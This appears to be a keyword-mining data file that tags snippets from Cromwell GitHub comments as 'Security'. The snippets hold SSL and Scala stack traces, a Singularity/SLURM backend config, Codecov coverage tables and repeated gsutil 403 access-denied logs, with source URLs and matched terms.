cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:8632,validat,validateCredential,8632,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,the `context` is also not accessible if not in the `receive` thread ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1001#issuecomment-225972827:26,access,accessible,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1001#issuecomment-225972827,1,['access'],['accessible']
Security,timized.foldLeft(LinearSeqOptimized.scala:122); 	at scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); 	at scala.collection.immutable.List.foldLeft(List.scala:86); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:98); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:18); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph$(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$ops$$anon$1.toWomGraph(WomGraphMaker.scala:8); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.$anonfun$toWomScatterNode$9(WdlDraft2WomScatterNodeMaker.scala:55); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.$anonfun$toWomScatterNode$7(WdlDraft2WomScatterNodeMaker.scala:52); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.toWomScatterNode(WdlDraft2WomScatterNodeMaker.scala:51); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.toWomScatterNode(WdlDraft2WomScatterNodeMaker.scala:15); 	at wom.transforms.WomScatterNodeMaker$Ops.toWomScatterNode(WomScatterNodeMaker.scala:10); 	at wom.transforms.WomScatterNodeMaker$Ops.toWomScatterNode$(WomScatterNodeMaker.scala:10); 	at wom.transforms.WomScatterNodeMaker$ops$$anon$1.toWomScatterNode(WomScatterNodeMaker.scala:10); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.buildNode$1(WdlDraft2WomGraphMaker.scala:90); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfun$toWomGraph$3(WdlDraft2WomGraphMaker.scala:38); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.foldFunction$1(WdlDraft2W,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502:4541,validat,validation,4541,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502,1,['validat'],['validation']
Security,"tion: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.ne",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:7721,secur,security,7721,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"to open, stopping the rest of the script from executing. 2. I failed to notice that `${out}` and `${err}` change between `submit` and `submit-docker`. When I would check the job that Cromwell schedules through SLURM, it would always fail. But I'm fairly sure that the job was failing to start because it was trying to write stdout to `/cromwell-executions/.../execution/stdout`, this is what led me to #1499. 3. An easy fix, but if your backend doesn't export a job-id, you need to set `run-in-background = true` in that backend's config. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINER COMMAND HERE ##; """"""; }; }; }; }; ```. And applied for something like SLURM:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: SLURM; providers: {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? queue; String? docker; String? docker_user; """"""; # you shoul",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:2750,hash,hash-lookup,2750,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,2,['hash'],['hash-lookup']
Security,tree#diff-c3VwcG9ydGVkQmFja2VuZHMvc2ZzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvc2ZzL1NoYXJlZEZpbGVTeXN0ZW1Jbml0aWFsaXphdGlvbkFjdG9yLnNjYWxh) | `100% <ø> (ø)` | :arrow_up: |; | [...romwell/cloudSupport/gcp/auth/GoogleAuthMode.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/2654?src=pr&el=tree#diff-Y2xvdWRTdXBwb3J0L3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2Nsb3VkU3VwcG9ydC9nY3AvYXV0aC9Hb29nbGVBdXRoTW9kZS5zY2FsYQ==) | `0% <ø> (ø)` | |; | [...cala/cromwell/backend/impl/jes/JesAttributes.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/2654?src=pr&el=tree#diff-c3VwcG9ydGVkQmFja2VuZHMvamVzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvaW1wbC9qZXMvSmVzQXR0cmlidXRlcy5zY2FsYQ==) | `90.9% <ø> (ø)` | :arrow_up: |; | [...well/backend/impl/jes/JesInitializationActor.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/2654?src=pr&el=tree#diff-c3VwcG9ydGVkQmFja2VuZHMvamVzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvaW1wbC9qZXMvSmVzSW5pdGlhbGl6YXRpb25BY3Rvci5zY2FsYQ==) | `39.39% <ø> (ø)` | :arrow_up: |; | [...a/cromwell/backend/impl/jes/JesConfiguration.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/2654?src=pr&el=tree#diff-c3VwcG9ydGVkQmFja2VuZHMvamVzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvaW1wbC9qZXMvSmVzQ29uZmlndXJhdGlvbi5zY2FsYQ==) | `100% <ø> (ø)` | :arrow_up: |; | [.../impl/jes/authentication/JesVMAuthentication.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/2654?src=pr&el=tree#diff-c3VwcG9ydGVkQmFja2VuZHMvamVzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvaW1wbC9qZXMvYXV0aGVudGljYXRpb24vSmVzVk1BdXRoZW50aWNhdGlvbi5zY2FsYQ==) | `100% <ø> (ø)` | :arrow_up: |; | [...omwell/filesystems/gcs/GcsPathBuilderFactory.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/2654?src=pr&el=tree#diff-ZmlsZXN5c3RlbXMvZ2NzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2ZpbGVzeXN0ZW1zL2djcy9HY3NQYXRoQnVpbGRlckZhY3Rvcnkuc2NhbGE=) | `50% <ø> (-16.67%)` | :arrow_down: |; | ... and [28 more](https://codecov.io/gh/broadinstitute/cromwell/pull/2654?src=pr&el=tree-more) | |,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2654#issuecomment-332953049:3089,authenticat,authentication,3089,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2654#issuecomment-332953049,1,['authenticat'],['authentication']
Security,"ull_dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19; ec38f93/call-M2/shard-108/"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full; _dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19ec38f93/call-M2/shard-108/, command failed: Traceback (most recent call; last):; File ""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py"", line 75, in <module>; main(); File ""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py"", line 22, in main; project, account = bootstrapping.GetActiveProjectAndAccount(); File ""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/bootstrapping.py"", line 205, in GetActiveProjectAndAccount; project_name = properties.VALUES.core.project.Get(validate=False); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1221, in Get; required); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1501, in _GetProperty; value = _GetPropertyWithoutDefault(prop, properties_file); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1539, in _GetPropertyWithoutDefault; value = callback(); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 693, in _GetGCEProject; return c_gce.Metadata().Project(); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 104, in Project; gce_read.GOOGLE_GCE_METADATA_PROJECT_URI); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py"", line 155, in TryFunc; return func(*args, **kwargs), None; File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 41, in _ReadNoProxyWithCleanFailures; ret",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400:3100,validat,validate,3100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400,2,['validat'],['validate']
Security,urity.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(Abstr,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8634,secur,security,8634,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"us_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/referenc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:3770,access,access,3770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"us_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/referenc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:5024,access,access,5024,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"us_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/referenc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:6278,access,access,6278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"us_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/referenc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:7532,access,access,7532,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"us_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/referenc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:8786,access,access,8786,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"us_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/referenc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:10040,access,access,10040,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
